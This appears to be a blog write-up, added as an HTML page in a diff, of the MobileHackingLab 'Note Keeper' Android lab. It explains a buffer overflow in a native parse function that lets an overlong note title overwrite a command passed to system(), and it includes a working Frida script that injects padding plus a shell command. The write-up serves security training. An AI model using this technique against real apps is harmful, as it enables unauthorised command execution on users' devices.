@@ -1,0 +1,209 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="After decompiling the APK, in the class com.mobilehackinglab.notekeeper.MainActivity the function parse from the notekeeper native library is loaded. Following the parse function decompiled and re-engineered with Ghidra from the libnotekeeper.so shared library: The parameter to_parse will correspond to the title of a newly created note. It&#39;s …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="MobileHackingLab - Note Keeper"/>
+  <meta property="og:description" content="After decompiling the APK, in the class com.mobilehackinglab.notekeeper.MainActivity the function parse from the notekeeper native library is loaded. Following the parse function decompiled and re-engineered with Ghidra from the libnotekeeper.so shared library: The parameter to_parse will correspond to the title of a newly created note. It&#39;s …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/mobile/mobilehackinglab/note-keeper.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2024-07-13 18:00:00+02:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Mobile"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; MobileHackingLab - Note Keeper</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="mobile/mobilehackinglab/note-keeper">MobileHackingLab - Note Keeper</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+    <p>After decompiling the APK, in the class <code>com.mobilehackinglab.notekeeper.MainActivity</code> the function <code>parse</code>  from the <code>notekeeper</code> native library is loaded.</p>
+<p><img alt="parse-inovking.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/note-keeper/parse-inovking.png"/></p>
+<p>Following the <code>parse</code> function decompiled and re-engineered with Ghidra from the <code>libnotekeeper.so</code> shared library:</p>
+<p><img alt="libnotekeeper-parse-function.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/note-keeper/libnotekeeper-parse-function.png"/></p>
+<p>The parameter <code>to_parse</code> will correspond to the title of a newly created note. It's value is copied into a <code>buffer</code> variable which size is <code>100</code> bytes. </p>
+<p>In the stack, the  <code>buffer</code> memory area is followed by the <code>cmd_string</code> (lines 8-9) which contains a static string (line 25) that is passed to the <code>system</code> function (line 34).</p>
+<p>Since there are no boundary checks when the <code>to_parse</code> value is copied to <code>buffer</code> (line 31-33), providing as input a value that exceeds the <code>buffer</code>'s 100 bytes will result into overriding the value in <code>cmd_string</code>.</p>
+<p>Following an example of Frida code exploiting this <strong>Buffer Overflow</strong> vulnerability:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(()=&gt;{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">MainActivity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">"com.mobilehackinglab.notekeeper.MainActivity"</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">MainActivity</span><span class="p">.</span><span class="nx">parse</span><span class="p">.</span><span class="nx">overload</span><span class="p">(</span><span class="s1">'java.lang.String'</span><span class="p">).</span><span class="nx">implementation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">args</span><span class="p">){</span>
+<span class="w">          </span><span class="kd">const</span><span class="w"> </span><span class="nx">padding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">exploit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">padding</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"id &gt; /data/data/com.mobilehackinglab.notekeeper/files/pwned"</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">exploit</span><span class="p">);</span>
+<span class="w">    </span><span class="p">};</span>
+
+<span class="p">})</span>
+</code></pre></div>
+<p>This script will set the <code>exploit</code> value as parameter to the <code>parse</code> function each time a new note is created in the application.</p>
+<p>The result is the following:</p>
+<p><img alt="rce.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/note-keeper/rce.png"/></p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
